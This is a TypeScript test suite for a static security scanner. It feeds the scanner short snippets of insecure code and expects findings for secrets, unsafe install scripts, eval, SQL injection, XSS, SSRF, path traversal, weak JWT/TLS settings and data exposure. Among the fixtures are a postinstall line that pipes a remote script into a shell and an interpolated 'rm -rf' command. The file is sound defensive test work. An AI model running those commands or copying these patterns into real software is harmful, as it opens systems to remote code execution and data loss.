import { describe, expect, test } from "bun:test"
import { SecurityScanner } from "../../src/security/scanner"

const scan = (content: string, file = "src/app.ts") => SecurityScanner.scan({ file, content })

describe("secrets", () => {
  test("detects an AWS access key and masks it in the snippet", () => {
    const findings = scan('const key = "AKIAIOSFODNN7EXAMPLE"')
    expect(findings.length).toBe(1)
    expect(findings[0].rule).toBe("secret-aws-access-key")
    expect(findings[0].severity).toBe("critical")
    expect(findings[0].line).toBe(1)
    expect(findings[0].column).toBe(14)
    expect(findings[0].snippet).not.toContain("AKIAIOSFODNN7EXAMPLE")
    expect(findings[0].snippet).toContain("AKIA")
  })

  test("detects private key material", () => {
    const findings = scan("-----BEGIN RSA PRIVATE KEY-----")
    expect(findings.some((finding) => finding.rule === "secret-private-key")).toBe(true)
  })

  test("flags generic credential assignments but ignores placeholders", () => {
    const flagged = scan('const API_TOKEN = "hunter2secret9"')
    expect(flagged.some((finding) => finding.rule === "secret-generic-assignment")).toBe(true)
    expect(scan('const API_TOKEN = "${API_TOKEN}"')).toEqual([])
    expect(scan('const password = "changeme123"')).toEqual([])
  })

  test("detects connection strings with embedded credentials", () => {
    const flagged = scan('const url = "postgres://admin:s3cretpw@db.internal:5432/app"')
    expect(flagged.some((finding) => finding.rule === "secret-database-url")).toBe(true)
    expect(scan('const url = "postgres://user:password@localhost:5432/app"')).toEqual([])
  })

  test("detects JWT-looking values", () => {
    const findings = scan('const token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc123def456"')
    expect(findings.some((finding) => finding.rule === "secret-jwt")).toBe(true)
  })
})

describe("dependencies", () => {
  test("flags unpinned versions in package.json only", () => {
    const content = '{ "dependencies": { "left-pad": "latest" } }'
    expect(scan(content, "package.json").some((finding) => finding.rule === "dependency-unpinned")).toBe(true)
    expect(scan(content, "other.json").some((finding) => finding.rule === "dependency-unpinned")).toBe(false)
  })

  test("flags install scripts that pipe remote content into a shell", () => {
    const content = '{ "scripts": { "postinstall": "curl -sL https://example.com/x.sh | sh" } }'
    expect(scan(content, "package.json").some((finding) => finding.rule === "dependency-unsafe-install-script")).toBe(
      true,
    )
  })
})

describe("rce", () => {
  test("flags eval and new Function in code but not in markdown", () => {
    expect(scan("eval(userInput)").some((finding) => finding.rule === "rce-eval")).toBe(true)
    expect(scan('const fn = new Function("return 1")').some((finding) => finding.rule === "rce-new-function")).toBe(true)
    expect(scan("eval(userInput)", "docs/guide.md")).toEqual([])
  })

  test("flags shell commands built with interpolation", () => {
    expect(scan('exec(`rm -rf ${dir}`)').some((finding) => finding.rule === "rce-shell-interpolation")).toBe(true)
    expect(scan('exec("git status")')).toEqual([])
  })
})

describe("injection", () => {
  test("flags SQL built with concatenation and leaves parameterized queries alone", () => {
    const flagged = scan('const sql = "SELECT * FROM users WHERE id = " + userId')
    expect(flagged.some((finding) => finding.rule === "injection-sql-interpolation")).toBe(true)
    expect(scan('db.query("SELECT * FROM users WHERE id = ?", [userId])')).toEqual([])
  })
})

describe("xss", () => {
  test("flags raw HTML sinks", () => {
    expect(scan("<div dangerouslySetInnerHTML={{ __html: html }} />").some((finding) => finding.rule === "xss-dangerously-set-inner-html")).toBe(true)
    expect(scan("element.innerHTML = userInput").some((finding) => finding.rule === "xss-inner-html-assignment")).toBe(true)
  })

  test("does not flag equality checks on innerHTML", () => {
    expect(scan("if (node.innerHTML == cached) return").some((finding) => finding.rule === "xss-inner-html-assignment")).toBe(false)
  })
})

describe("ssrf", () => {
  test("flags requests to request-derived URLs", () => {
    expect(scan("await fetch(req.query.url)").some((finding) => finding.rule === "ssrf-user-url")).toBe(true)
    expect(scan("await fetch(`https://api.example.com/${req.params.id}`)").some((finding) => finding.rule === "ssrf-user-url")).toBe(true)
  })

  test("does not flag fixed URLs", () => {
    expect(scan('await fetch("https://api.example.com/health")')).toEqual([])
  })
})

describe("path traversal", () => {
  test("flags filesystem paths built from request input", () => {
    expect(scan("const p = path.join(uploadDir, req.query.name)").some((finding) => finding.rule === "traversal-path-join-user-input")).toBe(true)
    expect(scan("await fs.readFile(req.params.file, 'utf8')").some((finding) => finding.rule === "traversal-fs-user-path")).toBe(true)
  })

  test("does not flag trusted roots", () => {
    expect(scan("const p = path.join(root, 'notes.md')")).toEqual([])
  })
})

describe("auth", () => {
  test("flags disabled verification", () => {
    expect(scan('jwt.verify(token, secret, { algorithms: ["none"] })').some((finding) => finding.rule === "auth-jwt-none-algorithm")).toBe(true)
    expect(scan("jwt.verify(token, secret, { ignoreExpiration: true })").some((finding) => finding.rule === "auth-jwt-ignore-expiration")).toBe(true)
    expect(scan("const agent = new https.Agent({ rejectUnauthorized: false })").some((finding) => finding.rule === "auth-tls-verification-disabled")).toBe(true)
  })

  test("flags decode-only usage", () => {
    expect(scan("const claims = jwt.decode(token)").some((finding) => finding.rule === "auth-jwt-decode-only")).toBe(true)
  })
})

describe("permissions", () => {
  test("flags world-writable modes", () => {
    expect(scan("await fs.chmod(file, 0o777)").some((finding) => finding.rule === "permission-world-writable")).toBe(true)
    expect(scan("chmod -R 777 /var/data").some((finding) => finding.rule === "permission-world-writable")).toBe(true)
    expect(scan("await fs.chmod(file, 0o755)")).toEqual([])
  })
})

describe("data exposure", () => {
  test("flags secrets in logs and environment dumps", () => {
    expect(scan("console.log('password', password)").some((finding) => finding.rule === "exposure-log-secret")).toBe(true)
    expect(scan("console.log(process.env)").some((finding) => finding.rule === "exposure-env-dump")).toBe(true)
    expect(scan("res.json({ error: err.stack })").some((finding) => finding.rule === "exposure-stack-trace")).toBe(true)
  })
})

describe("scan options", () => {
  test("restricts rules to the requested categories", () => {
    const content = ['const key = "AKIAIOSFODNN7EXAMPLE"', "eval(userInput)"].join("\n")
    const only = SecurityScanner.scan({ file: "src/app.ts", content, categories: ["rce"] })
    expect(only.length).toBe(1)
    expect(only[0].rule).toBe("rce-eval")
  })

  test("reports correct line and column numbers", () => {
    const content = ["const ok = 1", 'const key = "AKIAIOSFODNN7EXAMPLE"'].join("\n")
    const findings = SecurityScanner.scan({ file: "src/app.ts", content })
    expect(findings.length).toBe(1)
    expect(findings[0].line).toBe(2)
    expect(findings[0].column).toBe(14)
  })

  test("summarizes counts by severity and category", () => {
    const content = ['const key = "AKIAIOSFODNN7EXAMPLE"', "eval(userInput)"].join("\n")
    const summary = SecurityScanner.summarize(SecurityScanner.scan({ file: "src/app.ts", content }))
    expect(summary.total).toBe(2)
    expect(summary.severities.find((item) => item.severity === "critical")?.count).toBe(1)
    expect(summary.severities.find((item) => item.severity === "high")?.count).toBe(1)
    expect(summary.categories.find((item) => item.category === "secrets")?.count).toBe(1)
    expect(summary.categories.find((item) => item.category === "rce")?.count).toBe(1)
  })

  test("caps findings per rule", () => {
    const content = Array.from({ length: 40 }, (_, index) => `eval(input${index})`).join("\n")
    const findings = SecurityScanner.scan({ file: "src/app.ts", content })
    expect(findings.length).toBe(25)
  })

  test("returns nothing for clean code", () => {
    const content = [
      'import path from "path"',
      "export function read(dir: string, name: string) {",
      "  return Bun.file(path.join(dir, name)).text()",
      "}",
    ].join("\n")
    expect(SecurityScanner.scan({ file: "src/app.ts", content })).toEqual([])
  })
})
